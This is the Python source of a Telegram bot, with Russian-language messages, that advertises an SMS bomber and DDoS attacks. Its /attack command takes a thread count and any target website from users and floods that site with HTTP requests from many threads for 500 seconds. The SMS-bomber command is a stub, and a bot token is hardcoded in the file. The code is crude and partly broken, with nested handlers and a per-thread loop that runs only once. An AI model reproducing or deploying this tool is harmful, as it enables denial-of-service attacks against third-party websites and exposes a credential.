from aiogram import Bot, Dispatcher, executor, types
from aiogram.dispatcher.filters import Text
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher.filters.state import StatesGroup, State
from aiogram.utils.exceptions import Throttled
from aiogram.dispatcher import FSMContext
import time
import requests
import socket
from threading import Thread

bot = Bot(token="5461816268:AAFKCR5JTq04cQwV5hEFxWWa7259sgDQ1Sk")
storage = MemoryStorage()
dp = Dispatcher(bot, storage=storage)

coutrequests = 0
errorrequests = 0

class Attack(StatesGroup):
    thr = State()
    target = State()

@dp.message_handler(commands="start")
async def start(message: types.Message):
    await bot.send_message(message.chat.id, "📞SMS-бомбер - /bomber\n💻DDOS-атаки - /attacknnℹLOGS-/log\n🌟Разработчик - @personalscream")
    pass

def dos(site):
    global coutrequests
    global errorrequests
    for _ in range(1):
        try:
            resp = requests.get(site)
            print(resp.status_code)
            coutrequests = coutrequests + 1
            print(coutrequests)
            time.sleep(1)
        except Exception as r:
            errorrequests = errorrequests + 1
            print(f'Ошибка {r}')
            time.sleep(1)

@dp.message_handler(commands="attack")
async def attackstart(message: types.Message):
    await bot.send_message(message.chat.id, "⚡Введите количество поток.")
    await Attack.thr.set()
    @dp.message_handler(state=Attack.thr)
    async def theard(message: types.Message, state: FSMContext):
        await state.update_data(coutthr=int(message.text))
        await bot.send_message(message.chat.id, "⚡Отлично. Теперь введите сайт для атаки.")
        await Attack.next()
        @dp.message_handler(state=Attack.target)
        async def theards(message: types.Message, state: FSMContext):
            await state.update_data(trg=message.text)
            mainmsg = await bot.send_message(message.chat.id, "🛸Проверяем сайт...")
            data = await state.get_data()
            thrd = int(data['coutthr'])
            site = data['trg']
            try:
                await mainmsg.edit_text("🌟Запускаем...")
                for i in range(int(thrd)):
                    th = Thread(target=dos, args=(site, ))
                    th.start()
                    await mainmsg.edit_text(f"🌟Потоков: {i}/{thrd}\n☎Поддержка: @personalscream\n⚡Разработчик: @personalscream")
                    time.sleep(0.2)
                text = ""
                for _ in range(500):
                    global coutrequests
                    global errorrequests
                    test = requests.get(site)
                    text = f"Все потоки успешно начали атаку!\nЦель: {site}\nКол-во потоков: {thrd}\nРезультаты запросов: {test.status_code}\nВыполнено запросов: {coutrequests}\nОшибок подключения: {errorrequests}\nВремя атаки: 500 секунд\nОбновление сообщения: раз в 5 секунд"
                    await mainmsg.edit_text(text = text)
                    time.sleep(5)
                await mainmsg.edit_text(text = f"⚡Завершение потоков...")
                await mainmsg.edit_text(text = f"⚡Потоки завершены!\nХорошего вам дня.")
                coutrequests = 0
                errorrequests = 0
                await state.finish()
                pass
                
            except Exception as err:
                await mainmsg.edit_text(text = f"Ошибка!\n{err}")
                await state.finish()
                pass
 

@dp.message_handler(commands="bomber")
async def attackstart(message: types.Message):
    await bot.send_message(message.chat.id, "⚡Ищем свободных слотов....")
    time.sleep(5)
    await bot.send_message(message.chat.id, "❌Свободных слотов не найдено!")
    # if bomber = no^defined//

@dp.message_handler(commands="log")
async def attackstart(message: types.Message):
    await bot.send_message(message.chat.id, "⚡Введите сайт который вы ддосили!")
    @dp.message_handler(state=Attack.thr)
    async def theard(message: types.Message, state: FSMContext):
        await state.update_data(coutthr=int(message.text))
        await bot.send_message(message.chat.id, "🚀Ищем логи...")
                
if __name__ == "__main__":
    executor.start_polling(dp, skip_updates=False)
